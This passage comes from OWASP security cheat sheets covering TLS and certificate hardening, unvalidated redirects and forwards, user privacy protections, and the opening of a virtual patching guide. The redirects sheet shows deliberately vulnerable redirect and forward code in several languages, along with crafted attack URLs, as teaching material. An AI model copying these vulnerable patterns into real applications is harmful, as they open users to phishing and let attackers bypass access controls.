Parameters\r\n\r\nWhere ciphers that use the ephemeral Diffie-Hellman key exchange are in use (signified by the \"DHE\" or \"EDH\" strings in the cipher name) sufficiently secure Diffie-Hellman parameters (at least 2048 bits) should be used\r\n\r\nThe following command can be used to generate 2048 bit parameters:\r\n\r\n```bash\r\nopenssl dhparam 2048 -out dhparam2048.pem\r\n```\r\n\r\nThe [Weak DH](https://weakdh.org/sysadmin.html) website provides guidance on how various web servers can be configured to use these generated parameters.\r\n\r\n### Disable Compression\r\n\r\nTLS compression should be disabled in order to protect against a vulnerability (nicknamed [CRIME](https://threatpost.com/crime-attack-uses-compression-ratio-tls-requests-side-channel-hijack-secure-sessions-091312/77006/)) which could potentially allow sensitive information such as session cookies to be recovered by an attacker.\r\n\r\n### Patch Cryptographic Libraries\r\n\r\nAs well as the vulnerabilities in the SSL and TLS protocols, there have also been a large number of historic vulnerability in SSL and TLS libraries, with [Heartbleed](http://heartbleed.com) being the most well known. As such, it is important to ensure that these libraries are kept up to date with the latest security patches.\r\n\r\n### Test the Server Configuration\r\n\r\nOnce the server has been hardened, the configuration should be tested. The [OWASP Testing Guide chapter on SSL/TLS Testing](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security) contains further information on testing.\r\n\r\nThere are a number of online tools that can be used to quickly validate the configuration of a server, including:\r\n\r\n- [SSL Labs Server Test](https://www.ssllabs.com/ssltest)\r\n- [CryptCheck](https://cryptcheck.fr/)\r\n- [CypherCraft](https://www.cyphercraft.io/)\r\n- [Hardenize](https://www.hardenize.com/)\r\n- [ImmuniWeb](https://www.immuniweb.com/ssl/)\r\n- [Observatory by Mozilla](https://observatory.mozilla.org)\r\n- [Scanigma](https://scanigma.com)\r\n- [OWASP PurpleTeam](https://purpleteam-labs.com/) `cloud`\r\n\r\nAdditionally, there are a number of offline tools that can be used:\r\n\r\n- [O-Saft - OWASP SSL advanced forensic tool](https://wiki.owasp.org/index.php/O-Saft)\r\n- [CipherScan](https://github.com/mozilla/cipherscan)\r\n- [CryptoLyzer](https://gitlab.com/coroner/cryptolyzer)\r\n- [SSLScan - Fast SSL Scanner](https://github.com/rbsec/sslscan)\r\n- [SSLyze](https://github.com/nabla-c0d3/sslyze)\r\n- [testssl.sh - Testing any TLS/SSL encryption](https://testssl.sh)\r\n- [tls-scan](https://github.com/prbinu/tls-scan)\r\n- [OWASP PurpleTeam](https://purpleteam-labs.com/) `local`\r\n\r\n## Certificates\r\n\r\n### Use Strong Keys and Protect Them\r\n\r\nThe private key used to generate the cipher key must be sufficiently strong for the anticipated lifetime of the private key and corresponding certificate. The current best practice is to select a key size of at least 2048 bits. Additional information on key lifetimes and comparable key strengths can be found [here](http://www.keylength.com/en/compare/) and in [NIST SP 800-57](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57pt1r4.pdf).\r\n\r\nThe private key should also be protected from unauthorized access using filesystem permissions and other technical and administrative controls.\r\n\r\n### Use Strong Cryptographic Hashing Algorithms\r\n\r\nCertificates should use SHA-256 for the hashing algorithm, rather than the older MD5 and SHA-1 algorithms. These have a number of cryptographic weaknesses, and are not trusted by modern browsers.\r\n\r\n### Use Correct Domain Names\r\n\r\nThe domain name (or subject) of the certificate must match the fully qualified name of the server that presents the certificate. Historically this was stored in the `commonName` (CN) attribute of the certificate. However, modern versions of Chrome ignore the CN attribute, and require that the FQDN is in the `subjectAlternativeName` (SAN) attribute. For compatibility reasons, certificates should have the primary FQDN in the CN, and the full list of FQDNs in the SAN.\r\n\r\nAdditionally, when creating the certificate, the following should be taken into account:\r\n\r\n- Consider whether the \"www\" subdomain should also be included.\r\n- Do not include non-qualified hostnames.\r\n- Do not include IP addresses.\r\n- Do not include internal domain names on externally facing certificates.\r\n    - If a server is accessible using both internal and external FQDNs, configure it with multiple certificates.\r\n\r\n### Carefully Consider the use of Wildcard Certificates\r\n\r\nWildcard certificates can be convenient, however they violate [the principal of least privilege](https://wiki.owasp.org/index.php/Least_privilege), as a single certificate is valid for all subdomains of a domain (such as *.example.org). Where multiple systems are sharing a wildcard certificate, the likelihood that the private key for the certificate is compromised increases, as the key may be present on multiple systems. Additionally, the value of this key is significantly increased, making it a more attractive target for attackers.\r\n\r\nThe issues around the use of wildcard certificates are complicated, and there are [various](https://blog.sean-wright.com/wildcard-certs-not-quite-the-star/) other [discussions](https://gist.github.com/joepie91/7e5cad8c0726fd6a5e90360a754fc568) of them online.\r\n\r\nWhen risk assessing the use of wildcard certificates, the following areas should be considered:\r\n\r\n- Only use wildcard certificates where there is a genuine need, rather than for convenience.\r\n    - Consider the use of the [ACME](https://en.wikipedia.org/wiki/Automated_Certificate_Management_Environment) to allow systems to automatically request and update their own certificates instead.\r\n- Never use a wildcard certificates for systems at different trust levels.\r\n    - Two VPN gateways could use a shared wildcard certificate.\r\n    - Multiple instances of a web application could share a certificate.\r\n    - A VPN gateway and a public webserver **should not** share a wildcard certificate.\r\n    - A public webserver and an internal server **should not** share a wildcard certificate.\r\n- Consider the use of a reverse proxy server which performs TLS termination, so that the wildcard private key is only present on one system.\r\n- A list of all systems sharing a certificate should be maintained to allow them all to be updated if the certificate expires or is compromised.\r\n- Limit the scope of a wildcard certificate by issuing it for a subdomain (such as `*.foo.example.org`), or a for a separate domain.\r\n\r\n### Use an Appropriate Certification Authority for the Application's User Base\r\n\r\nIn order to be trusted by users, certificates must be signed by a trusted certificate authority (CA). For Internet facing applications, this should be one of the CAs which are well-known and automatically trusted by operating systems and browsers.\r\n\r\nThe [LetsEncrypt](https://letsencrypt.org) CA provides free domain validated SSL certificates, which are trusted by all major browsers. As such, consider whether there are any benefits to purchasing a certificate from a CA.\r\n\r\nFor internal applications, an internal CA can be used. This means that the FQDN of the certificate will not be exposed (either to an external CA, or publicly in certificate transparency lists). However, the certificate will only be trusted by users who have imported and trusted the internal CA certificate that was used to sign them.\r\n\r\n### Use CAA Records to Restrict Which CAs can Issue Certificates\r\n\r\nCertification Authority Authorization (CAA) DNS records can be used to define which CAs are permitted to issue certificates for a domain. The records contains a list of CAs, and any CA who is not included in that list should refuse to issue a certificate for the domain. This can help to prevent an attacker from obtaining unauthorized certificates for a domain through a less-reputable CA. Where it is applied to all subdomains, it can also be useful from an administrative perspective by limiting which CAs administrators or developers are able to use, and by preventing them from obtaining unauthorized wildcard certificates.\r\n\r\n### Always Provide All Needed Certificates\r\n\r\nIn order to validate the authenticity of a certificate, the user's browser must examine the certificate that was used to sign it and compare it to the list of CAs trusted by their system. In many cases the certificate is not directly signed by a root CA, but is instead signed by an intermediate CA, which is in turn signed by the root CA.\r\n\r\nIf the user does not know or trust this intermediate CA then the certificate validation will fail, even if the user trusts the ultimate root CA, as they cannot establish a chain of trust between the certificate and the root. In order to avoid this, any intermediate certificates should be provided alongside the main certificate.\r\n\r\n### Consider the use of Extended Validation Certificates\r\n\r\nExtended validation (EV) certificates claim to provide a higher level of verification of the entity, as they perform checks that the requestor is a legitimate legal entity, rather than just verifying the ownership of the domain name like normal (or \"Domain Validated\") certificates. This can effectively be viewed as the difference between \"This site is really run by Example Company Inc.\" vs \"This domain is really example.org\".\r\n\r\nHistorically these displayed differently in the browser, often showing the company name or a green icon or background in the address bar. However, as of 2019 both [Chrome](https://groups.google.com/a/chromium.org/forum/m/#!msg/security-dev/h1bTcoTpfeI/jUTk1z7VAAAJ) and [Firefox](https://groups.google.com/forum/m/?fromgroups&hl=en#!topic/firefox-dev/6wAg_PpnlY4) have announced that they will be removing these indicators, as they do not believe that EV certificates provide any additional protection.\r\n\r\nThere is no security downside to the use of EV certificates. However, as they are significantly more expensive than domain validated certificates, an assessment should be made to determine whether they provide any additional value\r\n\r\n## Application\r\n\r\n### Use TLS For All Pages\r\n\r\nTLS should be used for all pages, not just those that are considered sensitive such as the login page. If there are any pages that do not enforce the use of TLS, these could give an attacker an opportunity to sniff sensitive information such as session tokens, or to inject malicious JavaScript into the responses to carry out other attacks against the user.\r\n\r\nFor public facing applications, it may be appropriate to have the web server listening for unencrypted HTTP connections on port 80, and then immediately redirecting them with a permanent redirect (HTTP 301) in order to provide a better experience to users who manually type in the domain name. This should then be supported with the [HTTP Strict Transport Security (HSTS)](#use-http-strict-transport-security) header to prevent them accessing the site over HTTP in the future.\r\n\r\n### Do Not Mix TLS and Non-TLS Content\r\n\r\nA page that is available over TLS should not include any resources (such as JavaScript or CSS) files which are loaded over unencrypted HTTP. These unencrypted resources could allow an attacker to sniff session cookies or inject malicious code into the page. Modern browsers will also block attempts to load active content over unencrypted HTTP into secure pages.\r\n\r\n### Use the \"Secure\" Cookie Flag\r\n\r\nAll cookies should be marked with the \"[Secure](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookies)\" attribute, which instructs the browser to only send them over encrypted HTTPS connections, in order to prevent them from being sniffed from an unencrypted HTTP connection. This is important even if the website does not listen on HTTP (port 80), as an attacker performing an active man in the middle attack could present a spoofed webserver on port 80 to the user in order to steal their cookie.\r\n\r\n### Prevent Caching of Sensitive Data\r\n\r\nAlthough TLS provides protection of data while it is in transit, it does not provide any protection for data once it has reached the requesting system. As such, this information may be stored in the cache of the user's browser, or by any intercepting proxies which are configured to perform TLS decryption.\r\n\r\nWhere sensitive data is returned in responses, HTTP headers should be used to instruct the browser and any proxy servers not to cache the information, in order to prevent it being stored or returned to other users. This can be achieved by setting the following HTTP headers in the response:\r\n\r\n```text\r\nCache-Control: no-cache, no-store, must-revalidate\r\nPragma: no-cache\r\nExpires: 0\r\n```\r\n\r\n### Use HTTP Strict Transport Security\r\n\r\nHTTP Strict Transport Security (HSTS) instructs the user's browser to always request the site over HTTPS, and also prevents the user from bypassing certificate warnings. See the [HTTP Strict Transport Security cheatsheet](HTTP_Strict_Transport_Security_Cheat_Sheet.md) for further information on implementing HSTS.\r\n\r\n### Consider the use of Client-Side Certificates\r\n\r\nIn a typical configuration, TLS is used with a certificate on the server so that the client is able to verify the identity of the server, and to provide an encrypted connection between them. However, there are two main weaknesses with this approach:\r\n\r\n- The server does not have any mechanism to verify the identity of the client\r\n- The connection can be intercepted by an attacker who is able to obtain a valid certificate for the domain.\r\n    - This is most commonly used by businesses to carry out inspection of TLS traffic by installing a trusted CA certificate on there client systems.\r\n\r\nClient certificates address both of these issues by requiring that the client proves their identity to the server with their own certificate. This not only provides strong authentication of the identity of the client, but also prevents an intermediate party from performing TLS decryption, even if they have trusted CA certificate on the client system.\r\n\r\nClient certificates are rarely used on public systems due to a number of issues:\r\n\r\n- Issuing and managing client certificates introduces significant administrative overheads.\r\n- Non-technical users may struggle to install client certificates.\r\n- TLS decryption used by many organisations will cause client certificate authentication to fail.\r\n\r\nHowever, they should be considered for high-value applications or APIs, especially where there are a small number of technically sophisticated users, or where all users are part of the same organisation.\r\n\r\n### Consider Using Public Key Pinning\r\n\r\nPublic key pinning can be used to provides assurance that the server's certificate is not only valid and trusted, but also that it matches the certificate expected for the server. This provides protection against an attacker who is able to obtain a valid certificate, either by exploiting a weakness in the validation process, compromising a trusted certificate authority, or having administrative access to the client.\r\n\r\nPublic key pinning was added to browsers in the HTTP Public Key Pinning (HPKP) standard. However, due to a number of issues, it has subsequently been deprecated and is no longer recommended or [supported by modern browsers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Public-Key-Pins).\r\n\r\nHowever, public key pinning can still provide security benefits for mobile applications, thick clients and server-to-server communication. This is discussed in further detail in the [Pinning Cheat Sheet](Pinning_Cheat_Sheet.md).\r\n\r\n## Related Articles\r\n\r\n- OWASP - [TLS Cipher String Cheat Sheet](TLS_Cipher_String_Cheat_Sheet.md)\r\n- OWASP - [Testing for SSL-TLS](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_SSL_TLS_Ciphers_Insufficient_Transport_Layer_Protection.html), and OWASP [Guide to Cryptography](https://wiki.owasp.org/index.php/Guide_to_Cryptography)\r\n- OWASP - [Application Security Verification Standard (ASVS) - Communication Security Verification Requirements (V9)](https://github.com/OWASP/ASVS/blob/v4.0.1/4.0/en/0x17-V9-Communications.md)\r\n- Mozilla - [Mozilla Recommended Configurations](https://wiki.mozilla.org/Security/Server_Side_TLS#Recommended_configurations)\r\n- NIST - [SP 800-52 Rev. 1 Guidelines for the Selection, Configuration, and Use of Transport Layer Security (TLS) Implementations](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-52r2.pdf)\r\n- NIST - [NIST SP 800-57 Recommendation for Key Management, Revision 3](http://csrc.nist.gov/publications/nistpubs/800-57/sp800-57_part1_rev3_general.pdf), [Public DRAFT](http://csrc.nist.gov/publications/PubsDrafts.html#SP-800-57-Part%203-Rev.1)\r\n- NIST - [SP 800-95 Guide to Secure Web Services](https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-95.pdf)\r\n- IETF - [RFC 5280 Internet X.509 Public Key Infrastructure Certificate and Certificate Revocation List (CRL) Profile](https://tools.ietf.org/html/rfc5280)\r\n- IETF - [RFC 2246 The Transport Layer Security (TLS) Protocol Version 1.0 (JAN 1999)](https://tools.ietf.org/html/rfc2246)\r\n- IETF - [RFC 4346 The Transport Layer Security (TLS) Protocol Version 1.1 (APR 2006)](https://tools.ietf.org/html/rfc4346)\r\n- IETF - [RFC 5246 The Transport Layer Security (TLS) Protocol Version 1.2 (AUG 2008)](https://tools.ietf.org/html/rfc5246)\r\n- Bettercrypto - [Applied Crypto Hardening: HOWTO for secure crypto settings of the most common services)](https://bettercrypto.org)\r\n"
    },
    {
      "Unvalidated_Redirects_and_Forwards_Cheat_Sheet.md": "# Unvalidated Redirects and Forwards Cheat Sheet\r\n\r\n## Introduction\r\n\r\nUnvalidated redirects and forwards are possible when a web application accepts untrusted input that could cause the web application to redirect the request to a URL contained within untrusted input. By modifying untrusted URL input to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials.\r\n\r\nBecause the server name in the modified link is identical to the original site, phishing attempts may have a more trustworthy appearance. Unvalidated redirect and forward attacks can also be used to maliciously craft a URL that would pass the application's access control check and then forward the attacker to privileged functions that they would normally not be able to access.\r\n\r\n## Safe URL Redirects\r\n\r\nWhen we want to redirect a user automatically to another page (without an action of the visitor such as clicking on a hyperlink) you might implement a code such as the following:\r\n\r\nJava\r\n\r\n```java\r\nresponse.sendRedirect(\"http://www.mysite.com\");\r\n```\r\n\r\nPHP\r\n\r\n```php\r\n<?php\r\n/* Redirect browser */\r\nheader(\"Location: http://www.mysite.com\");\r\n/* Exit to prevent the rest of the code from executing */\r\nexit;\r\n?>\r\n```\r\n\r\nASP .NET\r\n\r\n```csharp\r\nResponse.Redirect(\"~/folder/Login.aspx\")\r\n```\r\n\r\nRails\r\n\r\n```ruby\r\nredirect_to login_path\r\n```\r\n\r\nRust actix web\r\n\r\n```rust\r\n  Ok(HttpResponse::Found()\r\n        .insert_header((header::LOCATION, \"https://mysite.com/\"))\r\n        .finish())\r\n```\r\n\r\nIn the examples above, the URL is being explicitly declared in the code and cannot be manipulated by an attacker.\r\n\r\n## Dangerous URL Redirects\r\n\r\nThe following examples demonstrate unsafe redirect and forward code.\r\n\r\n### Dangerous URL Redirect Example 1\r\n\r\nThe following Java code receives the URL from the parameter named `url` ([GET or POST](https://docs.oracle.com/javaee/7/api/javax/servlet/ServletRequest.html#getParameter-java.lang.String-)) and redirects to that URL:\r\n\r\n```java\r\nresponse.sendRedirect(request.getParameter(\"url\"));\r\n```\r\n\r\nThe following PHP code obtains a URL from the query string (via the parameter named `url`) and then redirects the user to that URL. Additionally, the PHP code after this `header()` function will continue to execute, so if the user configures their browser to ignore the redirect, they may be able to access the rest of the page.\r\n\r\n```php\r\n$redirect_url = $_GET['url'];\r\nheader(\"Location: \" . $redirect_url);\r\n```\r\n\r\nA similar example of C\\# .NET Vulnerable Code:\r\n\r\n```csharp\r\nstring url = request.QueryString[\"url\"];\r\nResponse.Redirect(url);\r\n```\r\n\r\nAnd in Rails:\r\n\r\n```ruby\r\nredirect_to params[:url]\r\n```\r\n\r\nRust actix web\r\n\r\n```rust\r\n  Ok(HttpResponse::Found()\r\n        .insert_header((header::LOCATION, query_string.path.as_str()))\r\n        .finish())\r\n```\r\n\r\nThe above code is vulnerable to an attack if no validation or extra method controls are applied to verify the certainty of the URL. This vulnerability could be used as part of a phishing scam by redirecting users to a malicious site.\r\n\r\nIf no validation is applied, a malicious user could create a hyperlink to redirect your users to an unvalidated malicious website, for example:\r\n\r\n```text\r\n http://example.com/example.php?url=http://malicious.example.com\r\n```\r\n\r\nThe user sees the link directing to the original trusted site (`example.com`) and does not realize the redirection that could take place\r\n\r\n### Dangerous URL Redirect Example 2\r\n\r\n[ASP .NET MVC 1 & 2 websites](https://docs.microsoft.com/en-us/aspnet/mvc/overview/security/preventing-open-redirection-attacks) are particularly vulnerable to open redirection attacks. In order to avoid this vulnerability, you need to apply MVC 3.\r\n\r\nThe code for the LogOn action in an ASP.NET MVC 2 application is shown below. After a successful login, the controller returns a redirect to the returnUrl. You can see that no validation is being performed against the returnUrl parameter.\r\n\r\nASP.NET MVC 2 LogOn action in `AccountController.cs` (see Microsoft Docs link provided above for the context):\r\n\r\n```csharp\r\n[HttpPost]\r\n public ActionResult LogOn(LogOnModel model, string returnUrl)\r\n {\r\n   if (ModelState.IsValid)\r\n   {\r\n     if (MembershipService.ValidateUser(model.UserName, model.Password))\r\n     {\r\n       FormsService.SignIn(model.UserName, model.RememberMe);\r\n       if (!String.IsNullOrEmpty(returnUrl))\r\n       {\r\n         return Redirect(returnUrl);\r\n       }\r\n       else\r\n       {\r\n         return RedirectToAction(\"Index\", \"Home\");\r\n       }\r\n     }\r\n     else\r\n     {\r\n       ModelState.AddModelError(\"\", \"The user name or password provided is incorrect.\");\r\n     }\r\n   }\r\n\r\n   // If we got this far, something failed, redisplay form\r\n   return View(model);\r\n }\r\n```\r\n\r\n### Dangerous Forward Example\r\n\r\nWhen applications allow user input to forward requests between different parts of the site, the application must check that the user is authorized to access the URL, perform the functions it provides, and it is an appropriate URL request.\r\n\r\nIf the application fails to perform these checks, an attacker crafted URL may pass the application's access control check and then forward the attacker to an administrative function that is not normally permitted.\r\n\r\nExample:\r\n\r\n```text\r\nhttp://www.example.com/function.jsp?fwd=admin.jsp\r\n```\r\n\r\nThe following code is a Java servlet that will receive a `GET` request with a URL parameter named `fwd` in the request to forward to the address specified in the URL parameter. The servlet will retrieve the URL parameter value [from the request](https://docs.oracle.com/javaee/7/api/javax/servlet/ServletRequest.html#getParameter-java.lang.String-) and complete the server-side forward processing before responding to the browser.\r\n\r\n```java\r\npublic class ForwardServlet extends HttpServlet\r\n{\r\n  protected void doGet(HttpServletRequest request, HttpServletResponse response)\r\n                    throws ServletException, IOException {\r\n    String query = request.getQueryString();\r\n    if (query.contains(\"fwd\"))\r\n    {\r\n      String fwd = request.getParameter(\"fwd\");\r\n      try\r\n      {\r\n        request.getRequestDispatcher(fwd).forward(request, response);\r\n      }\r\n      catch (ServletException e)\r\n      {\r\n        e.printStackTrace();\r\n      }\r\n    }\r\n  }\r\n}\r\n```\r\n\r\n## Preventing Unvalidated Redirects and Forwards\r\n\r\nSafe use of redirects and forwards can be done in a number of ways:\r\n\r\n- Simply avoid using redirects and forwards.\r\n- If used, do not allow the URL as user input for the destination.\r\n- Where possible, have the user provide short name, ID or token which is mapped server-side to a full target URL.\r\n    - This provides the highest degree of protection against the attack tampering with the URL.\r\n    - Be careful that this doesn't introduce an enumeration vulnerability where a user could cycle through IDs to find all possible redirect targets\r\n- If user input can’t be avoided, ensure that the supplied **value** is valid, appropriate for the application, and is **authorized** for the user.\r\n- Sanitize input by creating a list of trusted URLs (lists of hosts or a regex).\r\n    - This should be based on an allow-list approach, rather than a block list.\r\n- Force all redirects to first go through a page notifying users that they are going off of your site, with the destination clearly displayed, and have them click a link to confirm.\r\n\r\n### Validating URLs\r\n\r\nValidating and sanitising user-input to determine whether the URL is safe is not a trivial task. Detailed instructions how to implement URL validation is described [in Server Side Request Forgery Prevention Cheat Sheet](Server_Side_Request_Forgery_Prevention_Cheat_Sheet.md#application-layer)\r\n\r\n## References\r\n\r\n- [CWE Entry 601 on Open Redirects](http://cwe.mitre.org/data/definitions/601.html).\r\n- [WASC Article on URL Redirector Abuse](http://projects.webappsec.org/w/page/13246981/URL%20Redirector%20Abuse)\r\n- [Google blog article on the dangers of open redirects](http://googlewebmastercentral.blogspot.com/2009/01/open-redirect-urls-is-your-site-being.html).\r\n- [Preventing Open Redirection Attacks (C\\#)](http://www.asp.net/mvc/tutorials/security/preventing-open-redirection-attacks).\r\n"
    },
    {
      "User_Privacy_Protection_Cheat_Sheet.md": "# User Privacy Protection Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThis OWASP Cheat Sheet introduces mitigation methods that web developers may utilize in order to protect their users from a vast array of potential threats and aggressions that might try to undermine their privacy and anonymity. This cheat sheet focuses on privacy and anonymity threats that users might face by using online services, especially in contexts such as social networking and communication platforms.\r\n\r\n## Guidelines\r\n\r\n### Strong Cryptography\r\n\r\nAny online platform that handles user identities, private information or communications must be secured with the use of strong cryptography. User communications must be encrypted in transit and storage. User secrets such as passwords must also be protected using strong, collision-resistant hashing algorithms with increasing work factors, in order to greatly mitigate the risks of exposed credentials as well as proper integrity control.\r\n\r\nTo protect data in transit, developers must use and adhere to TLS/SSL best practices such as verified certificates, adequately protected private keys, usage of strong ciphers only, informative and clear warnings to users, as well as sufficient key lengths. Private data must be encrypted in storage using keys with sufficient lengths and under strict access conditions, both technical and procedural. User credentials must be hashed regardless of whether or not they are encrypted in storage.\r\n\r\nFor detailed guides about strong cryptography and best practices, read the following OWASP references:\r\n\r\n1. [Cryptographic Storage Cheat Sheet](Cryptographic_Storage_Cheat_Sheet.md).\r\n2. [Authentication Cheat Sheet](Authentication_Cheat_Sheet.md).\r\n3. [Transport Layer Protection Cheat Sheet](Transport_Layer_Protection_Cheat_Sheet.md).\r\n4. [Guide to Cryptography](https://wiki.owasp.org/index.php/Guide_to_Cryptography).\r\n5. [Testing for TLS/SSL](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_SSL_TLS_Ciphers_Insufficient_Transport_Layer_Protection.html).\r\n\r\n### Support HTTP Strict Transport Security\r\n\r\nHTTP Strict Transport Security (HSTS) is an HTTP header set by the server indicating to the user agent that only secure (HTTPS) connections are accepted, prompting the user agent to change all insecure HTTP links to HTTPS, and forcing the compliant user agent to fail-safe by refusing any TLS/SSL connection that is not trusted by the user.\r\n\r\nHSTS has average support on popular user agents, such as Mozilla Firefox and Google Chrome. Nevertheless, it remains very useful for users who are in consistent fear of spying and Man in the Middle Attacks.\r\n\r\nIf it is impractical to force HSTS on all users, web developers should at least give users the choice to enable it if they wish to make use of it.\r\n\r\nFor more details regarding HSTS, please visit:\r\n\r\n1. [HTTP Strict Transport Security in Wikipedia](https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security).\r\n2. [IETF for HSTS RFC](https://tools.ietf.org/html/rfc6797).\r\n3. [OWASP Appsec Tutorial Series - Episode 4: Strict Transport Security](http://www.youtube.com/watch?v=zEV3HOuM_Vw).\r\n\r\n### Digital Certificate Pinning\r\n\r\nCertificate Pinning is the practice of hardcoding or storing a predefined set of information (usually hashes) for digital certificates/public keys in the user agent (be it web browser, mobile app or browser plugin) such that only the predefined certificates/public keys are used for secure communication, and all others will fail, even if the user trusted (implicitly or explicitly) the other certificates/public keys.\r\n\r\nSome advantages for pinning are:\r\n\r\n- In the event of a CA compromise, in which a compromised CA trusted by a user can issue certificates for any domain, allowing evil perpetrators to eavesdrop on users.\r\n- In environments where users are forced to accept a potentially-malicious root CA, such as corporate environments or national PKI schemes.\r\n- In applications where the target demographic may not understand certificate warnings, and is likely to just allow any invalid certificate.\r\n\r\nFor details regarding certificate pinning, please refer to the following:\r\n\r\n1. [OWASP Certificate Pinning Cheat Sheet](Pinning_Cheat_Sheet.md).\r\n2. [Public Key Pinning Extension for HTTP RFC](https://tools.ietf.org/html/rfc7469).\r\n3. [Securing the SSL channel against man-in-the-middle attacks: Future technologies - HTTP Strict Transport Security and Pinning of Certs, by Tobias Gondrom](https://owasp.org/www-pdf-archive/OWASP_defending-MITMA_APAC2012.pdf).\r\n\r\n### Panic Modes\r\n\r\nA panic mode is a mode that threatened users can refer to when they fall under direct threat to disclose account credentials.\r\n\r\nGiving users the ability to create a panic mode can help them survive these threats, especially in tumultuous regions around the world. Unfortunately many users around the world are subject to types of threats that most web developers do not know of or take into account.\r\n\r\nExamples of panic modes are modes where distressed users can delete their data upon threat, log into fake inboxes/accounts/systems, or invoke triggers to backup/upload/hide sensitive data.\r\n\r\nThe appropriate panic mode to implement differs depending on the application type. A disk encryption software such as VeraCrypt might implement a panic mode that starts up a fake system partition if the user entered their distressed password.\r\n\r\nEmail providers might implement a panic mode that hides predefined sensitive emails or contacts, allowing reading innocent email messages only, usually as defined by the user, while preventing the panic mode from overtaking the actual account.\r\n\r\nAn important note about panic modes is that they must not be easily discoverable, if at all. An adversary inside a victim's panic mode must not have any way, or as few possibilities as possible, of finding out the truth. This means that once inside a panic mode, most non-sensitive normal operations must be allowed to continue (such as sending or receiving email), and that further panic modes must be possible to create from inside the original panic mode (If the adversary tried to create a panic mode on a victim's panic mode and failed, the adversary would know they were already inside a panic mode, and might attempt to hurt the victim).\r\n\r\nAnother solution would be to prevent panic modes from being generated from the user account, and instead making it a bit harder to spoof by adversaries. For example it could be only created Out Of Band, and adversaries must have no way to know a panic mode already exists for that particular account.\r\n\r\nThe implementation of a panic mode must always aim to confuse adversaries and prevent them from reaching the actual accounts/sensitive data of the victim, as well as prevent the discovery of any existing panic modes for a particular account.\r\n\r\nFor more details regarding VeraCrypt's hidden operating system mode, please refer to:\r\n\r\n- [VeraCrypt Hidden Operating System](https://www.veracrypt.fr/en/Hidden%20Operating%20System.html).\r\n\r\n### Remote Session Invalidation\r\n\r\nIn case user equipment is lost, stolen or confiscated, or under suspicion of cookie theft; it might be very beneficial for users to able to see view their current online sessions and disconnect/invalidate any suspicious lingering sessions, especially ones that belong to stolen or confiscated devices. Remote session invalidation can also helps if a user suspects that their session details were stolen in a Man-in-the-Middle attack.\r\n\r\nFor details regarding session management, please refer to:\r\n\r\n- [OWASP Session Management Cheat Sheet](Session_Management_Cheat_Sheet.md).\r\n\r\n### Allow Connections from Anonymity Networks\r\n\r\nAnonymity networks, such as the Tor Project, give users in tumultuous regions around the world a golden chance to escape surveillance, access information or break censorship barriers. More often than not, activists in troubled regions use such networks to report injustice or send uncensored information to the rest of the world, especially mediums such as social networks, media streaming websites and email providers.\r\n\r\nWeb developers and network administrators must pursue every avenue to enable users to access services from behind such networks, and any policy made against such anonymity networks need to be carefully re-evaluated with respect to impact on people around the world.\r\n\r\nIf possible, application developers should try to integrate or enable easy coupling of their applications with these anonymity networks, such as supporting SOCKS proxies or integration libraries (e.g. OnionKit for Android).\r\n\r\nFor more information about anonymity networks, and the user protections they provide, please refer to:\r\n\r\n1. [The Tor Project](https://www.torproject.org).\r\n2. [I2P Network](http://www.i2p2.de).\r\n3. [OnionKit: Boost Network Security and Encryption in your Android Apps](https://github.com/guardianproject/OnionKit).\r\n\r\n### Prevent IP Address Leakage\r\n\r\nPreventing leakage of user IP addresses is of great significance when user protection is in scope. Any application that hosts external third-party content, such as avatars, signatures or photo attachments; must take into account the benefits of allowing users to block third-party content from being loaded in the application page.\r\n\r\nIf it was possible to embed 3rd-party, external domain images, for example, in a user's feed or timeline; an adversary might use it to discover a victim's real IP address by hosting it on his domain and watch for HTTP requests for that image.\r\n\r\nMany web applications need user content to operate, and this is completely acceptable as a business process; however web developers are advised to consider giving users the option of blocking external content as a precaution. This applies mainly to social networks and forums, but can also apply to web-based e-mail, where images can be embedded in HTML-formatted emails.\r\n\r\nA similar issue exists in HTML-formatted emails that contain third-party images, however most email clients and providers block loading of third-party content by default; giving users better privacy and anonymity protection.\r\n\r\n### Honesty & Transparency\r\n\r\nIf the web application cannot provide enough legal or political protections to the user, or if the web application cannot prevent misuse or disclosure of sensitive information such as logs, the truth must be told to the users in a clear understandable form, so that users can make an educated choice about whether or not they should use that particular service.\r\n\r\nIf it doesn't violate the law, inform users if their information is being requested for removal or investigation by external entities.\r\n\r\nHonesty goes a long way towards cultivating a culture of trust between a web application and its users, and it allows many users around the world to weigh their options carefully, preventing harm to users in various contrasting regions around the world.\r\n\r\nMore insight regarding secure logging can be found at:\r\n\r\n- [OWASP Logging Cheat Sheet](Logging_Cheat_Sheet.md)\r\n"
    },
    {
      "Virtual_Patching_Cheat_Sheet.md": "# Virtual Patching Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThe goal with this cheat Sheet is to present a concise virtual patching framework that organizations can follow to maximize the timely implementation of mitigation protections.\r\n\r\n## Definition: Virtual Patching\r\n\r\n**A security policy enforcement layer which prevents and reports the exploitation attempt of a known vulnerability.**\r\n\r\nThe virtual patch works when the security enforcement layer analyzes transactions and intercepts attacks in transit, so malicious traffic never reaches the web application. The resulting impact of virtual patching is that, while the actual source code of the application itself has not been modified, the exploitation attempt does not succeed.\r\n\r\n## Why Not Just Fix the Code\r\n\r\nFrom a purely technical perspective, the number one remediation strategy would be for an organization to correct the identified vulnerability within the source code of the web application. This concept is universally agreed upon by both web application security experts and system owners. Unfortunately, in real world business situations, there arise many scenarios where updating the source code of a web application is not easy such as:\r\n\r\n- **Lack of resources** - Devs are already allocated to other projects.\r\n- **Third-party Software** - Code can not be modified by the user.\r\n- **Outsourced App Dev** - Changes would require a new project.\r\n\r\nThe important point is this 